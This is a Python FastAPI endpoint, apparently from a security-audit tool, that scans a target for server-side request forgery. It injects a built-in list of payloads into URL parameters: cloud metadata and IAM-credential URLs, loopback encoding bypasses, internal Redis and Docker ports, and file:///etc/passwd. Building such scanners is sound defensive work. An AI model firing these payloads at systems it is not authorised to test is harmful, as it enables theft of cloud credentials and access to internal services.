"""SSRF Scanner — Server-Side Request Forgery vulnerability auditor.

Features high-accuracy confidence taxonomy:
- Confirmed: Verifiable internal cloud metadata, IAM credentials, or internal daemon response.
- Likely: Explicit backend connection error traces (e.g. Connection refused to loopback port).
- Possible: Timing differential or gateway status changes (504/502).
- Not Detected: No evidence of server-side request execution.
"""
from __future__ import annotations
import asyncio
import re
import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
from typing import Any, Dict, List, Optional

from fastapi import APIRouter
from pydantic import BaseModel, Field

from backend.security.confidence import (
    Confidence,
    Severity,
    create_finding,
    standard_response,
)
from backend.security.http_client import SafeResponse, safe_request
from backend.security.logger import redact_secrets
from backend.security.target_validator import TargetValidationError, validate_target_url
from backend.tools.utils import clean_url, err, ok

router = APIRouter(tags=["scanning"])

COMMON_SSRF_PARAMS = [
    "url", "dest", "destination", "target", "redirect", "uri", "path",
    "feed", "proxy", "webhook", "domain", "load", "fetch", "src", "link",
    "api", "endpoint", "host", "preview", "download", "import", "service"
]

SSRF_PAYLOADS = [
    # AWS Metadata
    {
        "name": "AWS EC2 Metadata (IMDSv1)",
        "vector": "http://169.254.169.254/latest/meta-data/",
        "sig": [r"ami-id", r"instance-id", r"local-ipv4", r"security-credentials/"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    {
        "name": "AWS Security Credentials",
        "vector": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "sig": [r'"AccessKeyId"\s*:', r'"SecretAccessKey"\s*:', r'"Token"\s*:'],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # GCP Metadata
    {
        "name": "GCP Compute Engine Metadata",
        "vector": "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "sig": [r"^[0-9]{15,25}$", r"computeMetadata"],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # Azure Metadata
    {
        "name": "Azure Instance Metadata",
        "vector": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "sig": [r'"compute"\s*:\s*\{', r'"vmId"\s*:'],
        "category": "Cloud Metadata",
        "sev": "critical"
    },
    # Localhost Standard & Decimal IP Bypasses
    {
        "name": "Loopback 127.0.0.1",
        "vector": "http://127.0.0.1:80/",
        "sig": [],
        "category": "Loopback",
        "sev": "high"
    },
    {
        "name": "Decimal Dword IP Bypass (2130706433)",
        "vector": "http://2130706433/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    {
        "name": "Hexadecimal IP Bypass (0x7f000001)",
        "vector": "http://0x7f000001/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    {
        "name": "IPv6 Loopback [::1]",
        "vector": "http://[::1]:80/",
        "sig": [],
        "category": "Loopback Bypass",
        "sev": "high"
    },
    # Internal Ports & Services
    {
        "name": "Internal Redis Port (6379)",
        "vector": "http://127.0.0.1:6379/",
        "sig": [r"-ERR\s+", r"redis_version:\s*", r"\+PONG"],
        "category": "Internal Service",
        "sev": "critical"
    },
    {
        "name": "Docker Daemon API (2375)",
        "vector": "http://127.0.0.1:2375/version",
        "sig": [r'"ApiVersion"\s*:', r'"DockerRootDir"\s*:'],
        "category": "Internal Service",
        "sev": "critical"
    },
    {
        "name": "Local File Protocol (file:///etc/passwd)",
        "vector": "file:///etc/passwd",
        "sig": [r"root:x:0:0:[^:]*:/root:", r"daemon:x:[0-9]+:[0-9]+:"],
        "category": "Protocol Wrapper",
        "sev": "critical"
    },
]


class SsrfRequest(BaseModel):
    target: str = Field(..., min_length=1, max_length=2048)
    param: str = Field("", max_length=128)
    mode: str = Field("all", max_length=64)


@router.post("/ssrf_scanner")
async def ssrf_scanner(req: SsrfRequest):
    url = clean_url(req.target)
    try:
        validate_target_url(url)
    except TargetValidationError as tve:
        return err(f"Target validation failed: {tve}")

    parsed = urlparse(url)
    existing_qs = parse_qs(parsed.query)

    params_to_test = []
    if req.param and req.param.strip():
        params_to_test = [req.param.strip()]
    elif existing_qs:
        params_to_test = list(existing_qs.keys())
    else:
        params_to_test = ["url", "dest", "target", "redirect", "proxy", "webhook", "path", "feed"]

    if req.mode == "cloud":
        active_payloads = [p for p in SSRF_PAYLOADS if p["category"] == "Cloud Metadata"]
    elif req.mode == "loopback":
        active_payloads = [p for p in SSRF_PAYLOADS if "Loopback" in p["category"]]
    elif req.mode == "bypass":
        active_payloads = [p for p in SSRF_PAYLOADS if "Bypass" in p["category"] or p["category"] == "Protocol Wrapper"]
    else:
        active_payloads = SSRF_PAYLOADS

    findings: List[Dict[str, Any]] = []
    records: List[Dict[str, Any]] = []
    pocs: List[str] = []
    semaphore = asyncio.Semaphore(5)

    # Establish baseline request
    baseline_status = 200
    baseline_len = 0
    baseline_latency = 0.5
    try:
        t0 = time.time()
        base_resp = await safe_request("GET", url, timeout=8.0)
        baseline_latency = time.time() - t0
        baseline_status = base_resp.status_code
        baseline_len = len(base_resp.content)
    except Exception:
        pass

    async def test_ssrf_vector(param_name: str, payload_info: Dict[str, Any]):
        async with semaphore:
            test_val = payload_info["vector"]
            current_params = dict(existing_qs)
            current_params[param_name] = [test_val]
            flat_params = {k: v[0] if isinstance(v, list) else v for k, v in current_params.items()}
            new_query = urlencode(flat_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                t0 = time.time()
                resp = await safe_request("GET", test_url, timeout=7.0)
                elapsed_ms = round((time.time() - t0) * 1000)

                body = resp.text
                status_code = resp.status_code
                content_len = len(resp.content)

                conf = Confidence.NOT_DETECTED
                reason = ""
                evidence_text = ""

                # 1. Confirmed signatures check
                for sig_pat in payload_info.get("sig", []):
                    m = re.search(sig_pat, body, re.IGNORECASE)
                    if m:
                        conf = Confidence.CONFIRMED
                        snippet = redact_secrets(body[max(0, m.start() - 20): min(len(body), m.end() + 60)])
                        reason = f"Response body matched verified internal service signature: '{sig_pat}'"
                        evidence_text = snippet
                        break

                # 2. Likely backend TCP connection error traces
                if conf == Confidence.NOT_DETECTED:
                    backend_error_patterns = [
                        r"cURL error 7:\s*Failed to connect to (?:127\.0\.0\.1|localhost)",
                        r"Connection refused.*(?:127\.0\.0\.1|169\.254\.169\.254)",
                        r"socket\.error:\s*\[Errno 111\]\s*Connection refused",
                        r"WinError 10061.*actively refused",
                        r"Failed to open stream: Connection refused",
                    ]
                    for b_err in backend_error_patterns:
                        if re.search(b_err, body, re.IGNORECASE):
                            conf = Confidence.LIKELY
                            reason = "Backend server revealed connection refusal error to internal address."
                            evidence_text = f"Internal socket trace: {b_err}"
                            break

                # 3. Possible gateway timing differential
                if conf == Confidence.NOT_DETECTED:
                    if status_code in (504, 502) and baseline_status == 200:
                        conf = Confidence.POSSIBLE
                        reason = f"Server returned gateway timeout/error ({status_code}) when fetching internal target."
                        evidence_text = f"Status shifted from {baseline_status} to {status_code}"
                    elif (elapsed_ms / 1000.0) > (baseline_latency + 4.0):
                        conf = Confidence.POSSIBLE
                        reason = f"Significant timeout delay ({elapsed_ms}ms vs baseline {round(baseline_latency*1000)}ms)."
                        evidence_text = f"Latency delay differential: {elapsed_ms}ms"

                if conf in (Confidence.CONFIRMED, Confidence.LIKELY, Confidence.POSSIBLE):
                    sev = payload_info["sev"] if conf == Confidence.CONFIRMED else ("medium" if conf == Confidence.LIKELY else "low")
                    findings.append(create_finding(
                        title=f"SSRF ({conf.value.capitalize()}): {payload_info['name']} via '{param_name}'",
                        severity=sev,
                        confidence=conf.value,
                        detail=f"Injected '{test_val}' into parameter '{param_name}'. {reason} HTTP {status_code} ({content_len} bytes).",
                        recommendation="Implement strict URL/IP whitelisting, enforce IMDSv2 token hop limits, and block private subnets (RFC 1918 / 169.254.0.0/16).",
                        evidence=evidence_text,
                    ))
                    pocs.append(f"curl -s -k '{test_url}'")

                result_label = "Filtered / Safe"
                if conf == Confidence.CONFIRMED:
                    result_label = "💀 CONFIRMED"
                elif conf == Confidence.LIKELY:
                    result_label = "🔥 LIKELY"
                elif conf == Confidence.POSSIBLE:
                    result_label = "⚠ POSSIBLE"

                records.append({
                    "Parameter": param_name,
                    "Vector Name": payload_info["name"],
                    "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
                    "HTTP Status": status_code,
                    "Latency": f"{elapsed_ms}ms",
                    "Confidence": conf.value,
                    "Result": result_label,
                })

            except Exception as e:
                records.append({
                    "Parameter": param_name,
                    "Vector Name": payload_info["name"],
                    "Injected Payload": test_val[:35] + ("..." if len(test_val) > 35 else ""),
                    "HTTP Status": 0,
                    "Latency": "Error",
                    "Confidence": "not_detected",
                    "Result": f"Error ({str(e)[:30]})",
                })

    tasks = []
    for param in params_to_test:
        for pinfo in active_payloads:
            tasks.append(test_ssrf_vector(param, pinfo))

    if tasks:
        await asyncio.gather(*tasks)

    confirmed_count = sum(1 for f in findings if f.get("confidence") == "confirmed")
    likely_count = sum(1 for f in findings if f.get("confidence") == "likely")
    possible_count = sum(1 for f in findings if f.get("confidence") == "possible")

    return ok({
        "summary": {
            "Target": url,
            "Parameters Tested": len(params_to_test),
            "Vectors Executed": len(records),
            "Confirmed SSRF": confirmed_count,
            "Likely SSRF": likely_count,
            "Possible SSRF": possible_count,
        },
        "findings": findings,
        "records": records,
        "record_columns": ["Parameter", "Vector Name", "Injected Payload", "HTTP Status", "Latency", "Confidence", "Result"],
        "raw": "\n".join(pocs) if pocs else "No reproducible SSRF evidence detected.",
    })
